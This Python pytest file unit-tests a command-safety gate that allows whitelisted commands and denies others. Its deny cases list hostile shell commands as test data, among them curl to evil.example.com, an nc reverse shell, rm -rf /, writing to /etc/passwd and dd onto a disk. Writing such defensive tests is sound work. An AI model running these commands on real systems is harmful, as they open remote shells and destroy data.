"""
Deterministic unit tests for the safety layer.

Unlike the upstream benchmark scripts, these require no LLM and no network —
they exercise SafetyGate.validate_command and ExecutionGate.check_risk directly,
so results are reproducible run-to-run.
"""
import pytest

from swarm_safety_gate import SafetyGate, ExecutionGate


# --- Whitelisted commands should pass -------------------------------------

@pytest.mark.parametrize("cmd", [
    "git status",
    "git log --oneline",
    "python script.py",
    "pip install requests",
    "npm run build",
    "ls",
    "mkdir newdir",
    "cat README.md",
])
def test_whitelisted_commands_allowed(cmd):
    ok, reason = SafetyGate.validate_command(cmd)
    assert ok is True, f"expected {cmd!r} to be allowed, got: {reason}"
    assert reason == "Safe"


# --- Non-whitelisted base commands should be denied -----------------------

@pytest.mark.parametrize("cmd", [
    "curl http://evil.example.com",
    "wget http://evil.example.com",
    "nc -e /bin/sh 10.0.0.1 4444",
    "ssh user@host",
    "bash exploit.sh",
])
def test_non_whitelisted_commands_denied(cmd):
    ok, reason = SafetyGate.validate_command(cmd)
    assert ok is False
    assert "Whitelist" in reason


# --- Dangerous patterns denied even when the base command is whitelisted ---

@pytest.mark.parametrize("cmd", [
    "python -c 'import os' | sh",          # pipe
    "cat secrets > /etc/passwd",           # redirect
    "git status && rm -rf /",              # chained rm -rf
    "python evil.py; sudo reboot",         # sudo via chaining
    "echo dd if=/dev/zero of=/dev/sda",    # dd
    "python -m diskpart",                  # diskpart
    "ls; chmod 777 /",                     # chmod
])
def test_dangerous_patterns_denied(cmd):
    ok, reason = SafetyGate.validate_command(cmd)
    assert ok is False
    assert "Dangerous" in reason or "Whitelist" in reason


def test_empty_command_denied():
    ok, reason = SafetyGate.validate_command("")
    assert ok is False


# --- filesystem_delete guards ---------------------------------------------

def test_delete_refuses_root_and_empty():
    for p in ["", ".", "/", "C:\\", "C:/"]:
        out = SafetyGate.filesystem_delete(p, reason="cleanup")
        assert out.startswith("Error")


def test_delete_requires_reason():
    out = SafetyGate.filesystem_delete("some/file.txt", reason="")
    assert "must provide a reason" in out


# --- ExecutionGate risk levels --------------------------------------------

def test_risk_levels():
    assert ExecutionGate.check_risk("git", {}) == "low"
    assert ExecutionGate.check_risk("pip", {}) == "medium"
    assert ExecutionGate.check_risk("filesystem_delete", {}) == "high"
    assert ExecutionGate.check_risk("unknown_action", {}) == "unknown"


def test_run_command_risk_is_content_sensitive():
    assert ExecutionGate.check_risk("run_command", {"command": "git status"}) == "low"
    assert ExecutionGate.check_risk("run_command", {"command": "powershell -c ..."}) == "high"
    assert ExecutionGate.check_risk("run_command", {"command": "python foo.py"}) == "medium"
